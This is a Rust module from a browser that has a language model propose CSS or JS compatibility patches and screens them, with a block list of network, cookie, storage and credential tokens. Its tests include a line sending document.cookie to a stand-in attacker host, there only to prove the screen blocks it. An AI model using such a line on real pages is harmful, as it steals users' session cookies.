// SPDX-License-Identifier: MPL-2.0
// Copyright (c) 2026 JustMyth / Tan Ming Jing

//! AI repair helpers (pure: prompt building, reply parsing, static review). The shell makes
//! the model call with `mythbrowse-ai` (BYOK or Ollama) and owns the workflow:
//!
//! 1. The user presses "Ask Myth to fix" on a page the detector flagged (never automatic).
//! 2. The model gets the detector report, recent errors and a structure-only DOM summary
//!    (no page text, no form values) and answers with a [`Candidate`]: CSS, optional JS, and
//!    optionally a UA preset or a reader / simplified mode.
//! 3. [`review`] screens it. Anything on the block list cannot be tried at all.
//! 4. The user sees the explanation and the exact code, and may "Try on this page": the shell
//!    applies it to that one tab's current document only. Undo = reload without it.
//! 5. Only after trying it, "Keep for this site" saves it as a local rule scoped to that exact
//!    host ([`to_rule`]). Saved rules can be turned off or deleted from the panel. Nothing is
//!    uploaded or applied to other sites.
//!
//! The static review is defence in depth, not a sandbox: a determined script can hide what it
//! does. The real guarantees are the user's review, the one-host scope, and the undo.

use serde::{Deserialize, Serialize};

use crate::detect::{Assessment, ConsoleStats, ProbeReport, clip};
use crate::rules::{Mode, Rule, RuleKind};

pub const MAX_CANDIDATE_CSS: usize = 16 * 1024;
pub const MAX_CANDIDATE_JS: usize = 8 * 1024;

/// A patch the model proposed.
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
#[serde(default)]
pub struct Candidate {
    pub explanation: String,
    pub css: String,
    pub js: String,
    /// Only the built-in presets (`firefox`) are accepted.
    pub ua: Option<String>,
    pub mode: Option<Mode>,
}

impl Candidate {
    pub fn is_empty(&self) -> bool {
        self.css.trim().is_empty()
            && self.js.trim().is_empty()
            && self.ua.is_none()
            && self.mode.is_none()
    }
}

#[derive(Debug, Clone, Default, PartialEq, Serialize)]
pub struct Review {
    /// Reasons the candidate may not be tried at all.
    pub blocked: Vec<String>,
    /// Things the user should know before trying it.
    pub warnings: Vec<String>,
}

impl Review {
    pub fn allowed(&self) -> bool {
        self.blocked.is_empty()
    }
}

pub const SYSTEM_PROMPT: &str = "Propose a small CSS or JS patch that makes this web page usable \
in the Servo browser engine. Shim only APIs that the uncaught errors show the page actually \
calls. Never stub storage, service workers, clipboard, notifications or network APIs. Reply \
with ONE JSON object: {\"explanation\": \"...\", \"css\": \"...\", \"js\": \"...\", \
\"ua\": null, \"mode\": null}";

/// The user message for the model: page, findings, errors, console, missing features, DOM.
pub fn user_prompt(
    url: &str,
    assessment: &Assessment,
    report: &ProbeReport,
    console: &ConsoleStats,
    dom_summary: &str,
) -> String {
    let mut s = String::new();
    s.push_str(&format!("Page: {}\n", clip(url, 300)));
    s.push_str(&format!(
        "Detector: score {}/100, level {:?}\n",
        assessment.score, assessment.level
    ));
    for f in &assessment.findings {
        s.push_str(&format!("- [{:?}] {}\n", f.severity, f.text));
    }
    if !report.errors.is_empty() {
        s.push_str("Uncaught errors:\n");
        for e in report.errors.iter().take(12) {
            s.push_str(&format!(
                "- {} ({}:{})\n",
                clip(&e.m, 240),
                clip(&e.s, 120),
                e.l
            ));
        }
    }
    if !console.recent.is_empty() {
        s.push_str("Console:\n");
        for line in console.recent.iter().take(8) {
            s.push_str(&format!("- {}\n", clip(line, 200)));
        }
    }
    if !report.resource_failures.is_empty() {
        s.push_str("Failed resources:\n");
        for r in report.resource_failures.iter().take(8) {
            s.push_str(&format!("- {}\n", clip(r, 160)));
        }
    }
    if !report.missing.is_empty() {
        s.push_str(&format!(
            "Missing natively: {}\n",
            report.missing.join(", ")
        ));
    }
    if !report.css_missing.is_empty() {
        s.push_str(&format!(
            "Unsupported CSS: {}\n",
            report.css_missing.join(", ")
        ));
    }
    if !report.rules.is_empty() {
        s.push_str(&format!(
            "Compat rules already applied: {}\n",
            report.rules.join(", ")
        ));
    }
    let l = &report.layout;
    s.push_str(&format!(
        "Layout: viewport {}x{}, document height {}, body height {}, {} chars of text, {} elements, {} media, {}/{} sample points blank{}\n",
        l.vw,
        l.vh,
        l.doc_h,
        l.body_h,
        l.text_len,
        l.elements,
        l.media,
        l.blank_samples,
        l.samples,
        if l.overflow_hidden { ", scrolling locked" } else { "" }
    ));
    s.push_str("DOM summary (JSON, structure only):\n");
    s.push_str(&clip(dom_summary, 9000));
    s.push('\n');
    s
}

/// Pull the JSON object out of a model reply (bare, or in a ```json fence, or with chatter).
pub fn parse_reply(text: &str) -> Result<Candidate, String> {
    let t = text.trim();
    let body = if let Some(start) = t.find("```") {
        let rest = &t[start + 3..];
        let rest = rest.strip_prefix("json").unwrap_or(rest);
        rest.find("```").map_or(rest, |end| &rest[..end])
    } else {
        t
    };
    let (Some(a), Some(b)) = (body.find('{'), body.rfind('}')) else {
        return Err("The model did not return a patch.".into());
    };
    if b < a {
        return Err("The model did not return a patch.".into());
    }
    let raw: serde_json::Value = serde_json::from_str(&body[a..=b])
        .map_err(|e| format!("The model's patch was not valid JSON ({e})."))?;
    let get = |k: &str| {
        raw.get(k)
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .trim()
            .to_owned()
    };
    let ua = Some(get("ua")).filter(|s| !s.is_empty() && s != "null");
    let mode = match get("mode").as_str() {
        "reader" => Some(Mode::Reader),
        "simplified" => Some(Mode::Simplified),
        _ => None,
    };
    Ok(Candidate {
        explanation: clip(&get("explanation"), 600),
        css: unescape_doubled(&get("css")),
        js: unescape_doubled(&get("js")),
        ua,
        mode,
    })
}

/// Undo a doubled JSON escape. Models sometimes write `"js": "(() => {\\n  ...` so the
/// decoded code holds literal `\n` sequences instead of line breaks and does not parse
/// (seen with gpt-oss-20b). Only code with no real line break and several `\n` followed by
/// indentation or a brace is touched, so ordinary one-liners with a `"\n"` string stay as is.
fn unescape_doubled(code: &str) -> String {
    if code.contains('\n') {
        return code.to_owned();
    }
    let looks_doubled = code.matches("\\n").count() >= 2
        && (code.contains("\\n ") || code.contains("\\n}") || code.contains("\\n\\t"));
    if !looks_doubled {
        return code.to_owned();
    }
    let mut out = String::with_capacity(code.len());
    let mut chars = code.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.peek().copied() {
            Some('n') => {
                chars.next();
                out.push('\n');
            }
            Some('t') => {
                chars.next();
                out.push('\t');
            }
            Some('"') => {
                chars.next();
                out.push('"');
            }
            Some('\\') => {
                chars.next();
                out.push('\\');
            }
            _ => out.push('\\'),
        }
    }
    out
}

/// Tokens a patch may not contain (case-insensitive substring match on the code with
/// whitespace removed, so `fetch (` does not slip through).
const JS_BLOCKED: &[(&str, &str)] = &[
    ("fetch(", "network request (fetch)"),
    ("xmlhttprequest", "network request (XMLHttpRequest)"),
    ("websocket", "network connection (WebSocket)"),
    ("eventsource", "network connection (EventSource)"),
    ("sendbeacon", "network request (sendBeacon)"),
    ("eval(", "eval"),
    ("import(", "dynamic import"),
    ("importscripts", "importScripts"),
    ("document.cookie", "cookies"),
    ("localstorage", "storage"),
    ("sessionstorage", "storage"),
    ("indexeddb", "storage"),
    ("caches.", "cache storage"),
    ("postmessage", "messaging other windows"),
    ("window.open", "opening windows"),
    ("location.href=", "navigation"),
    ("location=", "navigation"),
    ("location.assign", "navigation"),
    ("location.replace", "navigation"),
    (".submit(", "form submission"),
    ("requestsubmit", "form submission"),
    ("document.write", "document.write"),
    ("password", "password fields"),
    ("credentials", "credentials"),
    ("crypto.subtle", "cryptography"),
    ("serviceworker", "service workers"),
    ("createelement('script", "loading scripts"),
    ("createelement(\"script", "loading scripts"),
    ("createelement(`script", "loading scripts"),
    ("<script", "loading scripts"),
    (".src=", "loading resources"),
    ("settimeout(\"", "string timers"),
    ("settimeout('", "string timers"),
    ("setinterval(", "repeating timers"),
];

const CSS_BLOCKED: &[(&str, &str)] = &[
    ("@import", "@import loads another stylesheet"),
    ("url(http", "remote url() load"),
    ("url(//", "remote url() load"),
    ("url(\"http", "remote url() load"),
    ("url('http", "remote url() load"),
    ("url(\"//", "remote url() load"),
    ("url('//", "remote url() load"),
    ("expression(", "CSS expression"),
    ("-moz-binding", "XBL binding"),
];

fn squash(s: &str) -> String {
    s.chars()
        .filter(|c| !c.is_whitespace())
        .flat_map(char::to_lowercase)
        .collect()
}

/// Static screen of a candidate. Blocked = cannot be tried; warnings = shown to the user.
pub fn review(c: &Candidate) -> Review {
    let mut r = Review::default();
    if c.is_empty() {
        r.blocked.push("The model did not propose a change.".into());
        return r;
    }
    if c.css.len() > MAX_CANDIDATE_CSS {
        r.blocked.push("CSS is too large.".into());
    }
    if c.js.len() > MAX_CANDIDATE_JS {
        r.blocked.push("Script is too large.".into());
    }
    let js = squash(&c.js);
    let mut seen = std::collections::BTreeSet::new();
    for (tok, why) in JS_BLOCKED {
        if js.contains(tok) && seen.insert(*why) {
            r.blocked.push(format!("Script uses {why}."));
        }
    }
    // `Function(` / `new Function(` (case-sensitive: `function (` declarations are fine).
    let js_case: String = c.js.chars().filter(|ch| !ch.is_whitespace()).collect();
    let calls_function_ctor = js_case.match_indices("Function(").any(|(i, _)| {
        js_case[..i].ends_with("new")
            || js_case[..i]
                .chars()
                .next_back()
                .is_none_or(|p| !(p.is_alphanumeric() || p == '_' || p == '$'))
    });
    if calls_function_ctor && seen.insert("new Function") {
        r.blocked.push("Script uses new Function.".into());
    }
    let css = squash(&c.css);
    for (tok, why) in CSS_BLOCKED {
        if css.contains(tok) && seen.insert(*why) {
            r.blocked.push(format!("CSS: {why}."));
        }
    }
    if let Some(ua) = &c.ua
        && crate::rules::ua_preset(ua).is_none()
    {
        r.blocked
            .push("Only the built-in user-agent presets are allowed.".into());
    }
    if !c.js.trim().is_empty() {
        r.warnings
            .push("Includes a script. Read it before trying it; it runs only on this page.".into());
    }
    if c.ua.is_some() {
        r.warnings.push(
            "Changes the browser name this site's scripts see. Takes effect after saving and reloading."
                .into(),
        );
    }
    r
}

/// The local rule a kept candidate becomes: this exact host only.
pub fn to_rule(c: &Candidate, host: &str, id_suffix: u64, now_ms: u64) -> Rule {
    let slug: String = host
        .chars()
        .map(|ch| {
            if ch.is_ascii_alphanumeric() {
                ch.to_ascii_lowercase()
            } else {
                '-'
            }
        })
        .collect();
    let id: String = format!("ai.{}.{}", slug.trim_matches('-'), id_suffix)
        .chars()
        .take(80)
        .collect();
    let some = |s: &str| Some(s.to_owned()).filter(|s| !s.trim().is_empty());
    Rule {
        id,
        title: clip(
            if c.explanation.is_empty() {
                "Fix from Myth"
            } else {
                &c.explanation
            },
            120,
        ),
        kind: RuleKind::Ai,
        hosts: vec![format!("={host}")],
        exclude_hosts: vec![],
        paths: vec![],
        ua: c.ua.clone(),
        css: some(&c.css),
        js: some(&c.js),
        block: vec![],
        mode: c.mode,
        enabled: true,
        fills: vec![],
        note: "Proposed by Myth, tried and kept by the user.".into(),
        created_ms: Some(now_ms),
    }
}

/// Apply a candidate to the current document of one tab (preview). CSS goes in a tagged
/// `<style>`; JS runs once in a try block; a mode is applied directly.
pub fn preview_script(c: &Candidate) -> String {
    let mut s = String::from("(function () {\n\"use strict\";\nvar out = [];\n");
    if !c.css.trim().is_empty() {
        s.push_str(&format!(
            "try {{ var st = document.createElement(\"style\"); st.setAttribute(\"data-mb-compat\", \"preview\"); st.textContent = {}; (document.head || document.documentElement).appendChild(st); out.push(\"css\"); }} catch (e) {{ out.push(\"css-failed\"); }}\n",
            serde_json::to_string(&c.css).unwrap_or_default()
        ));
    }
    if !c.js.trim().is_empty() {
        s.push_str("try {\n(function () {\n");
        s.push_str(&c.js);
        s.push_str("\n}).call(window);\nout.push(\"js\");\n} catch (e) { out.push(\"js-failed: \" + (e && e.message)); }\n");
    }
    if let Some(mode) = c.mode {
        s.push_str(&format!(
            "try {{ out.push(({})({})); }} catch (e) {{ out.push(\"mode-failed\"); }}\n",
            crate::bundle::READER_FUNCTION.trim(),
            serde_json::to_string(mode.as_str()).unwrap_or_default()
        ));
    }
    s.push_str("return out.join(\",\");\n})()");
    s
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::detect::assess;
    use crate::rules::Source;

    #[test]
    fn parses_fenced_and_bare_replies() {
        let r = parse_reply("Sure!\n```json\n{\"explanation\":\"Hide overlay\",\"css\":\".x{display:none}\",\"js\":\"\",\"ua\":null,\"mode\":null}\n```").unwrap();
        assert_eq!(r.css, ".x{display:none}");
        assert_eq!(r.ua, None);
        let r = parse_reply("{\"css\":\"\",\"js\":\"\",\"mode\":\"reader\"}").unwrap();
        assert_eq!(r.mode, Some(Mode::Reader));
        assert!(parse_reply("no json here").is_err());
        assert!(parse_reply("{not json}").is_err());
    }

    #[test]
    fn doubled_escapes_in_code_are_undone() {
        // As gpt-oss-20b answered on the archive.org report (model eval).
        let reply = r#"{"explanation":"Shim","css":"","js":"(() => {\\n  if (!('a' in window)) {\\n    window.a = 1;\\n  }\\n})();"}"#;
        let c = parse_reply(reply).unwrap();
        assert_eq!(
            c.js,
            "(() => {\n  if (!('a' in window)) {\n    window.a = 1;\n  }\n})();"
        );
        // Real line breaks: a "\n" inside a string literal is left alone.
        let ok = "var s = 'a\\nb';\nconsole.log(s);";
        assert_eq!(unescape_doubled(ok), ok);
        // A one-liner with a single "\n" in a string is left alone.
        let one = "console.log('x\\ny')";
        assert_eq!(unescape_doubled(one), one);
    }

    #[test]
    fn prompt_limits_shims_to_apis_in_errors() {
        assert!(SYSTEM_PROMPT.contains("Shim only APIs that the uncaught errors show"));
        assert!(SYSTEM_PROMPT.contains("Never stub storage, service workers"));
    }

    #[test]
    fn review_blocks_dangerous_code() {
        let mut c = Candidate {
            css: ".a{color:red}".into(),
            ..Default::default()
        };
        assert!(review(&c).allowed());
        c.js = "fetch ('https://evil.example/' + document . cookie)".into();
        let r = review(&c);
        assert!(!r.allowed());
        assert!(r.blocked.iter().any(|b| b.contains("fetch")));
        assert!(r.blocked.iter().any(|b| b.contains("cookies")));
        c.js = "new Function('x')".into();
        assert!(!review(&c).allowed());
        c.js = "var f = function () { return 1; }; f();".into();
        assert!(review(&c).allowed(), "plain functions are fine");
        c.js = "x.AsyncFunction('x')".into();
        assert!(review(&c).allowed());
        c.js = String::new();
        c.css = "@import url(https://x.example/a.css);".into();
        assert!(!review(&c).allowed());
        c.css = String::new();
        c.ua = Some("Evil/1.0".into());
        assert!(!review(&c).allowed());
        c.ua = Some("firefox".into());
        assert!(review(&c).allowed());
        assert!(!review(&Candidate::default()).allowed());
    }

    #[test]
    fn kept_rule_is_scoped_to_the_host_and_valid() {
        let c = Candidate {
            explanation: "Unlock scrolling".into(),
            css: "html,body{overflow:auto!important}".into(),
            js: "document.body.classList.remove('locked');".into(),
            ua: Some("firefox".into()),
            mode: None,
        };
        let rule = to_rule(&c, "www.example.com", 7, 1);
        assert_eq!(rule.hosts, vec!["=www.example.com"]);
        assert_eq!(rule.id, "ai.www-example-com.7");
        assert!(rule.validate(Source::Local).is_ok());
    }

    #[test]
    fn prompt_has_report_and_no_secrets_needed() {
        let report = ProbeReport {
            api: vec!["requestIdleCallback".into()],
            ..Default::default()
        };
        let a = assess(&report, &ConsoleStats::default());
        let p = user_prompt(
            "https://a.com/",
            &a,
            &report,
            &ConsoleStats::default(),
            "{}",
        );
        assert!(p.contains("requestIdleCallback"));
        assert!(p.contains("DOM summary"));
        let s = preview_script(&Candidate {
            css: "a{}".into(),
            mode: Some(Mode::Simplified),
            ..Default::default()
        });
        assert!(s.contains("data-mb-compat") && s.contains("\"simplified\""));
    }
}
